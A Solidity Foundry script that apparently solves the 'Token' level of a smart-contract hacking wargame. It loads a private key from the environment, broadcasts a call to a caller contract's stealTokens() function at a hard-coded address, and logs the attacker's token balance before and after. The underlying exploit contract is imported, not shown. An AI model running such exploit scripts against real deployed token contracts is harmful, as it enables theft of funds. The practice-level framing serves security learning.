// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.5;

import "../../lib/forge-std/src/Script.sol";
import {Token} from "../src/L6__Token.sol";
import {L6_Caller__Token} from "../src/L6_Caller__Token.sol";

// The goal of this level is for you to hack the basic token contract below.

// You are given 20 tokens to start with and you will beat the level if you
// somehow manage to get your hands on any additional tokens. Preferably a
// very large amount of tokens.

contract L6_Solution__Token is Script {
    Token public token = Token(0xC1FfC0641fC821E55753cB4999bf354f08e32552);
    L6_Caller__Token public token_caller =
        L6_Caller__Token(0xE857b421F885BEb3aC980132b85373BEF6bb6BC9);
    uint256 myBalance;

    function run() public {
        address _robberAccount = vm.envAddress("ACCOUNT");
        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");

        myBalance = token.balanceOf(_robberAccount);
        console.log("Prev balance: %s", myBalance);

        vm.startBroadcast(_robberPrivKey);

        token_caller.stealTokens();

        vm.stopBroadcast();

        myBalance = token.balanceOf(_robberAccount);
        console.log("New balance: %s", myBalance);
    }
}
